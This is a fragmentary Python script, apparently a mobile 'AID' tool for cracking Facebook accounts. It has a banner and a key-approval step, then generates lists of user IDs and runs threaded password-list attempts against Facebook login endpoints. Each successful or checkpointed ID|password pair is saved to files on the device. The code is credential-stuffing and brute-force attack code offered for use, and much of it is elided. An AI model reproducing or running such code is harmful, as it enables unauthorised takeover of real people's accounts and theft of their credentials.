...
logo=("""""""""
   ...
   d88P  888   888   888    888 
  d88P   888   888   888    888 
 d8888888888   888   888  .d88P 
d88P     888 8888888 8888888P"  
...
----------------------------------------------
 ...
 Team         :       AID
----------------------------------------------
    \x1b[37;41m\t WELLCOME TO AID TOOL\x1b[0;m\n\n\x1b[1;37m""")                  
def linex():
        print('\033[1;97m----------------------------------------------')
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/profile.php?id=100089948596624/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100050384120358');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/profile.php?id=100089948596624');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use ')
                        else:
                        ...
                        linex()
                        url_wa = "https://www.facebook.com/profile.php?id=100089948596624"
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi AID Sir, I Followed you please approve my key:)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python AID.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AID:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AID=session.cookies.get_dict().keys()
                        if "c_user" in AID:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m AID-OK %s | %s'%(ids,pas))
                                open('/sdcard/AID-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AID:
                                if 'y' in pcp:
                                        print('\r\033[1;91m AID-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
    ...
    'x_fb_background_state': '1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m AID-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
    ...
    'x_fb_background_state': '1',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mAID-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    'x_fb_background_state': '1',}
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AID-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m AID-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mAID-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AID-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
